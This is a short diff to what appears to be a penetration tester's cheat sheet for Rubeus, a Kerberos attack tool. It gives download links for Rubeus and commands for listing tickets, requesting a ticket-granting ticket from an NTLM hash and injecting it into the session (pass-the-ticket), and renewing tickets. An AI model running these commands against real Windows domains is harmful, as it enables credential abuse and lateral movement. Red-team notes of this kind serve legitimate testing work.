@@ -2,8 +2,11 @@
 https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1
 https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_Any/Rubeus.exe
 
+# list kerberos tickets applied to current logon session
+Rubeus.exe triage
+
 # get TGT for specific user using rc4_hmac, ptt = import the ticket into the current logon session
-Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<rc4Hash> /ptt
+Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<ntlmHash> /ptt
 
 # renew TGT /ticket can also be base64 of kirbi file
 Rubeus.exe renew /ticket:<pathToKirbiFile>
